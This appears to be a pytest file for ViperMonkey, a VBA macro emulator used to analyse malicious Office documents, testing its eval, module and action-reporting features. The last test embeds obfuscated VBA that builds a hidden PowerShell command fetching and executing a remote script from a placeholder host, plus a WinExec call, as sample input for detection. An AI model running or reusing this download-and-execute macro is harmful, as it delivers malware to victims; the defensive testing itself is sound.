"""Tests to ensure our API works as described in documentation."""

from textwrap import dedent

import pytest

import vipermonkey
from vipermonkey.core import *


def test_basic_eval():
    assert vipermonkey.eval('2') == 2
    assert vipermonkey.eval('2 + 2') == 4
    assert vipermonkey.eval('Chr(36)') == '$'
    assert vipermonkey.eval('"w" & Chr(111) & "rl" & Chr(123 Xor 31)') == 'world'
    assert vipermonkey.eval('Chr(71 Xor 18) & "2" & Chr(84 Xor 19)') == 'U2G'

    vba_code = dedent('''
        Dim m1, m2, m3 As String
        m1 = "he" & "ll" & Chr(111) & " "
        m2 = "w" & Chr(111) & "rl" & Chr(123 Xor 31)
        m3 = "!!!"
        m1 & m2 & m3
    ''')
    assert vipermonkey.eval(vba_code) == 'hello world!!!'


def test_eval_with_context():
    vba_code = dedent('''
        Dim m1, m2, m3, result As String
        m1 = "he" & "ll" & Chr(111) & " "
        m2 = "w" & Chr(111) & "rl" & Chr(123 Xor 31)
        m3 = "!!!"
        result = m1 & m2 & m3
    ''')
    context = vipermonkey.Context()
    vipermonkey.eval(vba_code, context=context)
    assert context.locals == {'m1': 'hello ', 'result': 'hello world!!!', 'm3': '!!!', 'm2': 'world'}
    assert context['result'] == 'hello world!!!'


def test_module():
    """Tests Module interaction."""
    # Test iterating functions.
    vba_code = dedent('''
        Attribute VB_Name = "ThisDocument"
        Attribute VB_Base = "1Normal.ThisDocument"
        
        Sub Document_Open()
            On Error Resume Next
            Dim message As String
            message = PrintHello("Jamie")
            MsgBox message
        End Sub
        
        Function PrintHello(person As String) As String
            Dim m1 As String
            m1 = "he" & "ll" & Chr(111) & " "
            PrintHello = m1 & person
        End Function
    ''')
    module = vipermonkey.Module(vba_code)
    assert sorted(proc.name for proc in module.procedures) == ['Document_Open', 'PrintHello']

    # Test iterating code_blocks.
    expected_code_blocks = [
        (Attribute_Statement, 'Attribute VB_Name = "ThisDocument"\n'),
        (Attribute_Statement, 'Attribute VB_Base = "1Normal.ThisDocument"\n'),
        (Sub, dedent('''\
            Sub Document_Open()
                On Error Resume Next
                Dim message As String
                message = PrintHello("Jamie")
                MsgBox message
            End Sub
        ''')),
        (Function, dedent('''\
            Function PrintHello(person As String) As String
                Dim m1 As String
                m1 = "he" & "ll" & Chr(111) & " "
                PrintHello = m1 & person
            End Function
        '''))
    ]
    for (expected_type, expected_code), code_block in zip(expected_code_blocks, module.code_blocks):
        assert code_block.type == expected_type
        assert str(code_block) == expected_code

    # Test evaluating directly with code_blocks
    for code_block in module.code_blocks:
        if code_block.type == vipermonkey.Function and code_block.name == 'PrintHello':
            assert code_block.eval(params=['Bob']) == 'hello Bob'
            break
    else:
        pytest.fail('Failed to find PrintHello() function.')

    # Test evaluating using prefilled context.
    context = vipermonkey.Context()
    module.load_context(context)
    assert vipermonkey.eval('PrintHello("Bob")', context=context) == 'hello Bob'


def test_file_extraction():
    vba_code = dedent(r'''
        Sub WriteFile(data As String)
            Dim a, b, c As String
            a = "Scr"
            b = "ipting" & Chr(46) & "FileSy"
            c = "st" & Chr(69) & "mObject"
            Dim fso As Object
            Set fso = CreateObject(a & b & c)
            Dim Fileout As Object
            Dim url As String
            url = "c:\users\public\" & "documents\hello.txt"
            Set Fileout = fso.CreateTextFile(url, True, True)
            Fileout.Write data
            Fileout.Close
        End Sub
        
        WriteFile("This " & "is some" & " file data!")
    ''')
    context = vipermonkey.Context()
    vipermonkey.eval(vba_code, context=context)
    assert context.open_files == {}
    assert context.closed_files == {'c:\\users\\public\\documents\\hello.txt': 'This is some file data!'}


def test_function_replacement():
    vba_code = dedent(r'''
        Public Function Base64Decode(ByVal s As String) As Byte()
            ' Some complex code
        End Function
        
        Public Sub Document_Open()
            Dim result As String
            result = Base64Decode("aGVsbG8gd29ybGQh")
        Enc Sub
    ''')

    def replaced_base64(context, params):
        # NOTE: We can update the context here if the function has a symptom
        return base64.b64decode(params[0])

    context = vipermonkey.Context()
    module = vipermonkey.Module(vba_code)
    # NOTE: The function should be replaced after the context is evaluated by the module. Otherwise the module will replace our function.
    module.eval(context)

    context.globals['Base64Decode'] = replaced_base64

    document_open = context['Document_Open']
    document_open.load_context(context)
    assert 'result' in context
    assert context['result'] == 'hello world!'


def test_reporting_actions():
    vba_code = dedent(r'''
        Public Function Execute() As Variant
        
            Dim m1, m2, m3, m4 As String
            
            m1 = "p" & "o" & "w" & "e" & "r" & "s" & "h" & "e" & "l" & "l" & " " & "-" & "w" & " " & "h" & "i" & "d" & "d" & "e"
            m2 = "n" & " -" & "e" & "x" & "e" & "c" & " b" & "y" & "p" & "a" & "s" & "s " & "-" & "c " & Chr(34)
            m3 = "$a" & "=" & "Invoke" & "-" & "We" & "bRequest" & " ww" & "w.example.com" & "/" & "scr" & "ipt.txt"
            m4 = "; " & "Inv" & "ok" & "e-Expr" & "ession " & "$" & "a" & Chr(34) & ""
            
            Shell m1 & m2 & m3 & m4, vbHide
            
            WinExec "wscript powershell.exe -x run.ps1", 0
        
        End Function
        
        Execute
    ''')

    context = vipermonkey.Context()
    vipermonkey.eval(vba_code, context=context)

    print dict(context.actions)

    assert dict(context.actions) == {
        'Shell function': [
            ('Execute Command', 'powershell -w hidden -exec bypass -c '
                                '"$a=Invoke-WebRequest www.example.com/script.txt; Invoke-Expression $a"')],
        'Interesting Function Call': [('WinExec', ['wscript powershell.exe -x run.ps1', 0])],
        'Interesting Command Execution': [('Run', 'wscript powershell.exe -x run.ps1')],
    }



